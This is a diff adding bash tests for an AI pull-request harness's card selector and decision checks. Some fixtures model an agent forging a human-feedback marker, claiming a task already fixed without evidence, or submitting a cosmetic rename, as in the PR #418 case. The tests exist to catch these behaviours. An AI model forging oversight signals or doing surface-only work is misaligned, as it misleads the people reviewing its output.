+check "an old migration_required marker stays settled until fresh owner action" \
+    $([ "$retired_nospec_rc" = "3" ] && echo 0 || echo 1)
+
+# The same cache now holds a fresh attempt marker for that card: a request
+# newer than the attempt must still beat the cooldown, exactly like
+# decision-bound context does.
+run_requested_again="$(PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_CACHE_DIR="$TMP_DIR/run-request-cache" \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/run-request-cards.json" 2>/dev/null)"
+check "a stale run request does not beat its own cooldown" \
+    $([ "$(printf '%s' "$run_requested_again" | jq -r '.id8 // empty')" != "99999999" ] \
+      && echo 0 || echo 1)
+
+# A pass that declines a run-requested card must consume the request. Without
+# this the one-minute watcher keeps forcing a Kanban dispatch for a card the
+# selector can never pick, which runs the lane MORE often than the twenty-minute
+# schedule the request was meant to jump.
+rm -f "$TMP_DIR/claim-urls"
+AUTOPR_TEST_CURL_URLS="$TMP_DIR/claim-urls" MATCHA_AUTOPR_ENV="$env_file" \
+    PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_CACHE_DIR="$TMP_DIR/run-request-cache" \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/run-request-cards.json" >/dev/null 2>&1
+check "a declined run request is deferred instead of falsely claimed" \
+    $(grep -q '/tasks/99999999-0000-4000-8000-000000000009/autopr/run-defer' \
+        "$TMP_DIR/claim-urls" && echo 0 || echo 1)
+
+# The dashboard asks the same selector what would run next. That probe must
+# never consume a human's queued request.
+rm -f "$TMP_DIR/claim-urls"
+AUTOPR_SELECT_READ_ONLY=true AUTOPR_TEST_CURL_URLS="$TMP_DIR/claim-urls" \
+    MATCHA_AUTOPR_ENV="$env_file" \
+    PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_CACHE_DIR="$TMP_DIR/run-request-cache" \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/run-request-cards.json" >/dev/null 2>&1
+check "the read-only dashboard probe never consumes a run request" \
+    $([ ! -s "$TMP_DIR/claim-urls" ] && echo 0 || echo 1)
+
+prior_pr_retry_ok=0
+for prior_state in CLOSED MERGED; do
+    prior_selected="$(PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+        AUTOPR_TEST_PRIOR_TASK_PR="$prior_state" \
+        AUTOPR_CACHE_DIR="$TMP_DIR/prior-$prior_state-cache" \
+        "$AUTOPR_DIR/select.sh" "$TMP_DIR/reconsideration-cards.json")"
+    if [ "$(printf '%s' "$prior_selected" | jq -r '.id8')" != "77777777" ] \
+        || [ "$(printf '%s' "$prior_selected" | jq -r '.mode')" != "investigate" ]; then
+        prior_pr_retry_ok=1
+    fi
+done
+check "pending Todo context overrides a closed or merged historical bot PR" \
+    "$prior_pr_retry_ok"
+
+after_reconsideration="$(PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_CACHE_DIR="$reconsideration_cache" \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/reconsideration-cards.json")"
+check "a failed reconsideration cools down instead of spinning every tick" \
+    $([ "$(printf '%s' "$after_reconsideration" | jq -r '.id8')" = "88888888" ] && echo 0 || echo 1)
+
+cat > "$TMP_DIR/bin/gh" <<'EOF'
+#!/usr/bin/env bash
+if [ "$1 $2" = "pr list" ]; then
+    if [[ "$*" == *"--label autopr"* ]]; then
+        printf '0\n'
+    elif [[ "$*" == *"--head bot/task-55555555"* ]]; then
+        printf '%s\n' '[{"state":"MERGED","createdAt":"2026-08-27T00:00:00Z","number":55,"labels":[{"name":"autopr"}],"body":""}]'
+    else
+        printf '[]\n'
+    fi
+fi
+EOF
+chmod +x "$TMP_DIR/bin/gh"
+cat > "$TMP_DIR/merged-card.json" <<'EOF'
+[
+  {"task_id":"55555555-0000-4000-8000-000000000005","id8":"55555555","project_id":"p","title":"Already merged","board_column":"changes_requested","created_at":"2026-01-01T00:00:00Z","last_moved_at":"2026-01-01T00:00:00Z","progress_note":"🤖 AUTO SETUP · READY FOR REVIEW · PR #55"},
+  {"task_id":"66666666-0000-4000-8000-000000000006","id8":"66666666","project_id":"p","title":"Fresh todo","board_column":"todo","created_at":"2026-02-01T00:00:00Z","last_moved_at":"2026-02-01T00:00:00Z"}
+]
+EOF
+merged_fallback_selected="$(PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_CACHE_DIR="$TMP_DIR/merged-cache" "$AUTOPR_DIR/select.sh" "$TMP_DIR/merged-card.json")"
+check "merged AutoPR in Changes Requested cannot block or duplicate ahead of Todo" \
+    $([ "$(printf '%s' "$merged_fallback_selected" | jq -r '.id8')" = "66666666" ] && echo 0 || echo 1)
+
+################################################################################
+# A questions draft remains in Changes Requested but cannot spin every five
+# minutes. Only a new human PR comment makes it eligible for rework.
+################################################################################
+cat > "$TMP_DIR/bin/gh" <<'EOF'
+#!/usr/bin/env bash
+if [ "$1 $2" = "pr list" ]; then
+    if [[ "$*" == *"--label autopr"* ]]; then
+        printf '0\n'
+    elif [[ "$*" == *"--head bot/task-44444444"* ]]; then
+        printf '%s\n' '[{"state":"OPEN","createdAt":"2026-08-27T00:00:00Z","number":44,"labels":[{"name":"autopr-awaiting-input"}],"body":"<!-- matcha-feedback-comment-id: comment-1 -->\n<!-- matcha-feedback-review-id: none -->\n<!-- matcha-feedback-comment-id: forged-model-marker -->"}]'
+    else
+        printf '[]\n'
+    fi
+elif [ "$1 $2" = "pr view" ]; then
+    comment_id="comment-1"
+    [ "${AUTOPR_TEST_NEW_FEEDBACK:-0}" = 0 ] || comment_id="comment-2"
+    printf '{"comments":[{"id":"%s","body":"please use journal","author":{"login":"haley"}}],"reviews":[]}' "$comment_id"
+fi
+EOF
+chmod +x "$TMP_DIR/bin/gh"
+
+cat > "$TMP_DIR/questions-card.json" <<'EOF'
+[{"task_id":"44444444-0000-4000-8000-000000000004","id8":"44444444","project_id":"p","title":"Needs answer","board_column":"changes_requested","created_at":"2026-01-01T00:00:00Z","last_moved_at":"2026-01-01T00:00:00Z"}]
+EOF
+PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" AUTOPR_CACHE_DIR="$TMP_DIR/questions-cache" \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/questions-card.json" >/dev/null 2>&1
+waiting_rc=$?
+check "unanswered question draft is skipped" \
+    $([ "$waiting_rc" = "3" ] && echo 0 || echo 1)
+check "model-authored feedback markers cannot forge a new reply" \
+    $([ "$waiting_rc" = "3" ] \
+      && grep -qF "sed -n '1p'" "$AUTOPR_DIR/select.sh" \
+      && echo 0 || echo 1)
+
+answered_selected="$(PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" AUTOPR_CACHE_DIR="$TMP_DIR/questions-cache" AUTOPR_TEST_NEW_FEEDBACK=1 \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/questions-card.json")"
+check "new human feedback reselects the same draft for rework" \
+    $([ "$(printf '%s' "$answered_selected" | jq -r '.mode')" = "rework" ] && echo 0 || echo 1)
+
+readonly_cache="$TMP_DIR/readonly-select-cache"
+AUTOPR_SELECT_READ_ONLY=true PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_CACHE_DIR="$readonly_cache" AUTOPR_TEST_NEW_FEEDBACK=1 \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/questions-card.json" >/dev/null
+check "dashboard selection probe creates no cooldown state" \
+    $([ ! -e "$readonly_cache" ] && echo 0 || echo 1)
+
+################################################################################
+# acceptance_criteria_met — the verdict a false-premise card needs.
+#
+# A reviewer send-back sets trust_still_broken + draft_pr, and both directive
+# clauses ban already_fixed. With the truth unrepresentable, the highest-scoring
+# legal outcome was "implementation", and the only implementable thing left on
+# an already-finished card was a cosmetic rename. That is PR #418. The escape
+# has to survive those directives while still refusing an unevidenced claim.
+################################################################################
+decision_dir="$TMP_DIR/decision-guards"
+mkdir -p "$decision_dir"
+head_sha="$(git -C "$REPO_ROOT" rev-parse HEAD)"
+printf '{"directives":["draft_pr","trust_still_broken"],"test_route":null}\n' \
+    > "$decision_dir/policy.json"
+
+write_decision() {
+    local reason="$1" evidence="$2"
+    jq -n --arg reason "$reason" --argjson evidence "$evidence" '
+      {schema_version: 1,
+       outcome: "no_safe_action",
+       safe_changes_present: false,
+       questions: [],
+       criticality: {level: "yellow", reasons: ["already satisfied"]},
+       confidence: {
+         requirements_clarity: {score: 20, reason: "r"},
+         evidence_quality:     {score: 15, reason: "r"},
+         code_localization:    {score: 15, reason: "r"},
+         verification_strength:{score: 10, reason: "r"},
+         production_alignment: {score: 10, reason: "r"}},
+       no_safe_action_reason: $reason}
+      + (if $evidence == null then {} else {acceptance_evidence: $evidence} end)
+    ' > "$decision_dir/raw.json"
+}
+
+normalize_rc() {
+    ( cd "$REPO_ROOT" && bash "$AUTOPR_DIR/decision.sh" normalize-grounded \
+        "$decision_dir/raw.json" "$decision_dir/out.json" "$decision_dir/policy.json" ) \
+        >/dev/null 2>&1
+    echo $?
+}
+
+good_evidence="$(jq -n --arg sha "$head_sha" \
+    '[{criterion:"route registered",path:"client/src/routes/AppRoutes.tsx",line:116,commit:$sha}]')"
+
+write_decision already_fixed null
+check "bare already_fixed is still refused under an owner directive" \
+    $([ "$(normalize_rc)" != "0" ] && echo 0 || echo 1)
+
+check "bare already_fixed is also refused without an owner directive" \
+    $(! (cd "$REPO_ROOT" && bash "$AUTOPR_DIR/decision.sh" normalize-grounded \
+        "$decision_dir/raw.json" "$decision_dir/out.json") >/dev/null 2>&1 \
+      && echo 0 || echo 1)
+
+write_decision already_fixed "$good_evidence"
+check "already_fixed with verified evidence remains available without a force directive" \
+    $( (cd "$REPO_ROOT" && bash "$AUTOPR_DIR/decision.sh" normalize-grounded \
+        "$decision_dir/raw.json" "$decision_dir/out.json") >/dev/null 2>&1 \
+      && echo 0 || echo 1)
+
+write_decision acceptance_criteria_met null
+check "acceptance_criteria_met without evidence is refused" \
+    $([ "$(normalize_rc)" != "0" ] && echo 0 || echo 1)
+
+write_decision acceptance_criteria_met "$good_evidence"
+check "acceptance_criteria_met with verified evidence survives draft_pr" \
+    $([ "$(normalize_rc)" = "0" ] && echo 0 || echo 1)
+
+write_decision acceptance_criteria_met \
+    "$(jq -n --arg sha "$head_sha" '[{criterion:"c",path:"client/src/routes/AppRoutes.tsx",line:999999,commit:$sha}]')"
+check "acceptance evidence pointing past the end of a file is refused" \
+    $([ "$(normalize_rc)" != "0" ] && echo 0 || echo 1)
+
+write_decision acceptance_criteria_met \
+    '[{"criterion":"c","path":"client/src/routes/AppRoutes.tsx","line":1,"commit":"deadbee"}]'
+check "acceptance evidence citing an unknown commit is refused" \
+    $([ "$(normalize_rc)" != "0" ] && echo 0 || echo 1)
+
+# "Real object" is not "relevant object". A commit that exists in the runner's
+# store but is not on this branch's history bought the one verdict that
+# overrides an owner's draft_pr directive.
+sibling_sha="$(git -C "$REPO_ROOT" -c user.name=autopr-test -c user.email=autopr-test@example.com \
+    commit-tree "HEAD^{tree}" -p "HEAD~1" -m "autopr evidence-guard fixture" 2>/dev/null || true)"
+if [ -n "$sibling_sha" ]; then
+    write_decision acceptance_criteria_met \
+        "$(jq -n --arg sha "$sibling_sha" '[{criterion:"c",path:"client/src/routes/AppRoutes.tsx",line:116,commit:$sha}]')"
+    check "acceptance evidence citing a commit outside this branch's history is refused" \
+        $([ "$(normalize_rc)" != "0" ] && echo 0 || echo 1)
+else
+    echo "skip: could not build a sibling commit for the ancestry guard" >&2
+fi
+
+blank_line="$(git -C "$REPO_ROOT" show "$head_sha:client/src/routes/AppRoutes.tsx" \
+    | grep -n '^[[:space:]]*$' | head -1 | cut -d: -f1)"
+if [ -n "$blank_line" ]; then
+    write_decision acceptance_criteria_met \
+        "$(jq -n --arg sha "$head_sha" --argjson line "$blank_line" \
+            '[{criterion:"c",path:"client/src/routes/AppRoutes.tsx",line:$line,commit:$sha}]')"
+    check "acceptance evidence citing a blank line is refused" \
+        $([ "$(normalize_rc)" != "0" ] && echo 0 || echo 1)
+fi
+
+write_decision acceptance_criteria_met \
+    "$(jq -n --arg sha "$head_sha" '[{criterion:"c",path:"docs/does-not-exist-at-head.md",line:1,commit:$sha}]')"
+check "acceptance evidence citing a path absent at HEAD is refused" \
+    $([ "$(normalize_rc)" != "0" ] && echo 0 || echo 1)
+
+################################################################################
+# Cosmetic-diff guard — the machine-detectable signature of the same failure.
+#
+# Fixtures, not commit SHAs: a shallow or filtered clone made `git show <sha>`
+# fail, cosmetic_diff.py read empty stdin, and the assertion failed for an
+# environmental reason rather than a regression.
+################################################################################
+cosmetic_diff_rc() {
+    python3 "$AUTOPR_DIR/cosmetic_diff.py" <<< "$1"
+    echo $?
+}
+
+# PR #418's whole merged client change: the route, the row, and the gate the
+# card asked for all already existed; only the label text moved.
+pr418_diff="-  { to: '/app/credential-templates', icon: BadgeCheck, label: 'Credentialing', feature: 'credential_templates' },
++  { to: '/app/credential-templates', icon: BadgeCheck, label: 'Credential Templates', feature: 'credential_templates' },"
+check "PR #418's merged diff is detected as string-literal churn" \
+    $([ "$(cosmetic_diff_rc "$pr418_diff")" = "0" ] && echo 0 || echo 1)
+
+feature_diff="-  const rows = useRows()
++  const rows = useRows()
++  const grouped = useMemo(() => groupRows(rows), [rows])"
+check "a real feature diff is not mistaken for string-literal churn" \
+    $([ "$(cosmetic_diff_rc "$feature_diff")" = "1" ] && echo 0 || echo 1)
+
+# A row moved between sidebar groups: identical text on both sides, and real
+# structural work. The guard used to reject the card that asked for it.
+moved_row_diff="-      { to: '/app/foo', icon: Shield, label: 'Foo' },
++      { to: '/app/foo', icon: Shield, label: 'Foo' },"
+check "a relocated nav row is structure, not a reword" \
+    $([ "$(cosmetic_diff_rc "$moved_row_diff")" = "1" ] && echo 0 || echo 1)
+
+# Same skeleton, different string — but the string is a path, so the diff
+# repoints the product rather than rewording it.
+route_diff='-        <Route path="/app/old" element={<Old />} />
++        <Route path="/app/new" element={<Old />} />'
+check "a repointed route path is structure, not a reword" \
+    $([ "$(cosmetic_diff_rc "$route_diff")" = "1" ] && echo 0 || echo 1)
+
+nav_target_diff="-  { to: '/app/old', icon: Shield, label: 'Foo' },
++  { to: '/app/new', icon: Shield, label: 'Foo' },"
+check "a repointed nav destination is structure, not a reword" \
+    $([ "$(cosmetic_diff_rc "$nav_target_diff")" = "1" ] && echo 0 || echo 1)
+
+check "a pure addition is real work, not a reword" \
+    $([ "$(cosmetic_diff_rc '+  const answer = "42"')" = "1" ] && echo 0 || echo 1)
+
+################################################################################
+# Hold, rejected/parked ledger, and the failure budget.
+################################################################################
+# A server-side hold is absolute: the only Todo candidate is never picked.
+cat > "$TMP_DIR/held-card.json" <<'EOF'
+[
+  {"task_id":"bbbbbbbb-0000-4000-8000-00000000000b","id8":"bbbbbbbb","project_id":"p","title":"On hold","board_column":"todo","created_at":"2026-01-01T00:00:00Z","last_moved_at":"2026-01-01T00:00:00Z","progress_note":"","autopr_paused":true,"autopr_hold_reason":"docs allowlist"}
+]
+EOF
+PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_CACHE_DIR="$TMP_DIR/held-cache" \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/held-card.json" >/dev/null 2>&1
+held_rc=$?
+jq '.[0].board_column = "changes_requested"' "$TMP_DIR/held-card.json" > "$TMP_DIR/held-cr-card.json"
+PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_CACHE_DIR="$TMP_DIR/held-cache" \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/held-cr-card.json" >/dev/null 2>&1
+held_cr_rc=$?
+check "a held card is never selected, in Todo or Changes Requested" \
+    $([ "$held_rc" = "3" ] && [ "$held_cr_rc" = "3" ] && echo 0 || echo 1)
+
+# A policy refusal publish.sh recorded stays settled like no-spec until a
+# human moves the card; a later move reopens it.
+cat > "$TMP_DIR/rejected-card.json" <<'EOF'
+[
+  {"task_id":"cccccccc-0000-4000-8000-00000000000c","id8":"cccccccc","project_id":"p","title":"Touched docs","board_column":"changes_requested","created_at":"2026-01-01T00:00:00Z","last_moved_at":"2026-01-01T00:00:00Z","progress_note":"🤖 AUTO SETUP · BLOCKED: DISALLOWED PATHS · build 850 · [autopr:rejected 2026-01-02T00:00:00Z] disallowed_paths · docs/tools.sh"}
+]
+EOF
+PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_CACHE_DIR="$TMP_DIR/rejected-cache" \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/rejected-card.json" >/dev/null 2>&1
+rejected_rc=$?
+jq '.[0].last_moved_at = "2026-01-03T00:00:00Z"' "$TMP_DIR/rejected-card.json" > "$TMP_DIR/rejected-moved-card.json"
+rejected_moved="$(PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_CACHE_DIR="$TMP_DIR/rejected-moved-cache" \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/rejected-moved-card.json" 2>/dev/null)"
+check "a path-policy rejection stays settled until a human moves the card" \
+    $([ "$rejected_rc" = "3" ] \
+      && [ "$(printf '%s' "$rejected_moved" | jq -r '.id8 // empty')" = "cccccccc" ] \
+      && echo 0 || echo 1)
+
+# The failure ledger: same reason counts up, a new reason starts over,
+# success forgets. The file's mtime still drives the cooldown.
+budget_task="dddddddd-0000-4000-8000-00000000000d"
+export AUTOPR_CACHE_DIR="$TMP_DIR/budget-cache"
+autopr_record_outcome "$budget_task" failure publish
+autopr_record_outcome "$budget_task" failure publish
+autopr_record_outcome "$budget_task" failure "disallowed paths!"
+ledger_after_new_reason="$(cat "$AUTOPR_CACHE_DIR/attempts/dddddddd")"
+autopr_record_outcome "$budget_task" failure disallowed_paths_
+autopr_record_outcome "$budget_task" failure disallowed_paths_
+ledger_after_three="$(cat "$AUTOPR_CACHE_DIR/attempts/dddddddd")"
+autopr_record_outcome "$budget_task" success
+budget_cleared=$([ ! -e "$AUTOPR_CACHE_DIR/attempts/dddddddd" ] && echo 0 || echo 1)
+unset AUTOPR_CACHE_DIR
+check "the failure ledger counts identical reasons, restarts on a new one, and clears on success" \
+    $([ "$(printf '%s' "$ledger_after_new_reason" | cut -f1,2)" = "$(printf '1\tdisallowed_paths_')" ] \
+      && [ "$(printf '%s' "$ledger_after_three" | cut -f1,2)" = "$(printf '3\tdisallowed_paths_')" ] \
+      && [ "$budget_cleared" = 0 ] && echo 0 || echo 1)
+
+# Three identical failures with no human signal since: the pass holds the
+# card, notes why, asks the owner, and picks nothing.
+cat > "$TMP_DIR/budget-card.json" <<'EOF'
+[
+  {"task_id":"dddddddd-0000-4000-8000-00000000000d","id8":"dddddddd","project_id":"p","title":"Keeps failing","board_column":"todo","created_at":"2026-01-01T00:00:00Z","last_moved_at":"2026-01-01T00:00:00Z","progress_note":"🤖 AUTO SETUP · READY FOR REVIEW · build 850"}
+]
+EOF
+mkdir -p "$TMP_DIR/budget-select-cache/attempts"
+printf '3\tverify\t2026-01-02T00:00:00Z\n' > "$TMP_DIR/budget-select-cache/attempts/dddddddd"
+touch -t 202601020000 "$TMP_DIR/budget-select-cache/attempts/dddddddd"
+rm -f "$TMP_DIR/park-urls" "$TMP_DIR/park-args"
+PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_TEST_CURL_URLS="$TMP_DIR/park-urls" AUTOPR_TEST_CURL_ARGS="$TMP_DIR/park-args" \
+    MATCHA_AUTOPR_ENV="$env_file" \
+    AUTOPR_CACHE_DIR="$TMP_DIR/budget-select-cache" \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/budget-card.json" >/dev/null 2>&1
+parked_rc=$?
+check "three identical failures park the card on hold with a note and a chat ask" \
+    $([ "$parked_rc" = "3" ] \
+      && grep -q '/tasks/dddddddd-0000-4000-8000-00000000000d/autopr/unqueue' "$TMP_DIR/park-urls" \
+      && grep -q 'autopr: 3× verify' "$TMP_DIR/park-args" \
+      && grep -q 'ON HOLD: REPEATED FAILURES' "$TMP_DIR/park-args" \
+      && grep -q '\[autopr:parked ' "$TMP_DIR/park-args" \
+      && grep -q '/autopr/context-request' "$TMP_DIR/park-urls" \
+      && echo 0 || echo 1)
+
+# The read-only dashboard probe reports the same skip but writes nothing.
+rm -f "$TMP_DIR/park-urls"
+AUTOPR_SELECT_READ_ONLY=true PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_TEST_CURL_URLS="$TMP_DIR/park-urls" MATCHA_AUTOPR_ENV="$env_file" \
+    AUTOPR_CACHE_DIR="$TMP_DIR/budget-select-cache" \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/budget-card.json" >/dev/null 2>&1
+parked_ro_rc=$?
+check "the read-only probe never parks a card" \
+    $([ "$parked_ro_rc" = "3" ] && [ ! -s "$TMP_DIR/park-urls" ] && echo 0 || echo 1)
+
+# A human signal after the last failure buys one more run.
+jq '.[0].last_moved_at = "2026-01-03T00:00:00Z"' "$TMP_DIR/budget-card.json" > "$TMP_DIR/budget-moved-card.json"
+rm -f "$TMP_DIR/park-urls"
+budget_moved="$(PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_TEST_CURL_URLS="$TMP_DIR/park-urls" MATCHA_AUTOPR_ENV="$env_file" \
+    AUTOPR_CACHE_DIR="$TMP_DIR/budget-select-cache" \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/budget-moved-card.json" 2>/dev/null)"
+check "moving a parked-eligible card lets it run once more" \
+    $([ "$(printf '%s' "$budget_moved" | jq -r '.id8 // empty')" = "dddddddd" ] \
+      && ! grep -q 'unqueue' "$TMP_DIR/park-urls" 2>/dev/null && echo 0 || echo 1)
+
+# A fresh attempt inside the cooldown still skips without parking (mtime rule).
+printf '3\tverify\t2026-01-02T00:00:00Z\n' > "$TMP_DIR/budget-select-cache/attempts/dddddddd"
+rm -f "$TMP_DIR/park-urls"
+PATH="$TMP_DIR/bin:$PATH" GITHUB_REPOSITORY="tajaa/matcha-recruit" \
+    AUTOPR_TEST_CURL_URLS="$TMP_DIR/park-urls" MATCHA_AUTOPR_ENV="$env_file" \
+    AUTOPR_CACHE_DIR="$TMP_DIR/budget-select-cache" \
+    "$AUTOPR_DIR/select.sh" "$TMP_DIR/budget-card.json" >/dev/null 2>&1
+cooldown_rc=$?
+check "the cooldown still applies before the budget is consulted" \
+    $([ "$cooldown_rc" = "3" ] && ! grep -q 'unqueue' "$TMP_DIR/park-urls" 2>/dev/null && echo 0 || echo 1)
+
+################################################################################
+# publish.sh and investigate.sh both `git reset --hard` $REPO_ROOT with no
+# pathspec. Without AUTOPR_WORKSPACE_ROOT that is the checkout they run from,
+# so they must refuse a dirty tree *before* anything else — including argument
+# validation. A guard placed above the REPO_ROOT assignment dies in its own
+# subshell under `set -u` and silently lets the reset through.
+################################################################################
+GUARD_REPO="$TMP_DIR/guard-repo"
+mkdir -p "$GUARD_REPO/apps/msandbox"
+cp -R "$AUTOPR_DIR" "$GUARD_REPO/apps/msandbox/harness"
+git -C "$GUARD_REPO" init -q
+git -C "$GUARD_REPO" -c user.email=t@example.com -c user.name=t commit -qm init --allow-empty
+echo "work in progress" > "$GUARD_REPO/uncommitted.txt"
+
+for guarded in publish.sh investigate.sh; do
+    guard_err="$(unset AUTOPR_WORKSPACE_ROOT; GITHUB_REPOSITORY=x/x \
+        "$GUARD_REPO/apps/msandbox/harness/$guarded" 2>&1 >/dev/null)"
+    guard_rc=$?
+    check "$guarded refuses a dirty worktree before reading its arguments" \
+        $([ "$guard_rc" != "0" ] \
+            && printf '%s' "$guard_err" | grep -qF 'AUTOPR_WORKSPACE_ROOT is unset' \
+            && [ -f "$GUARD_REPO/uncommitted.txt" ] && echo 0 || echo 1)
+done
+
+echo
+echo "$PASS passed, $FAIL failed"
+[ "$FAIL" -eq 0 ]
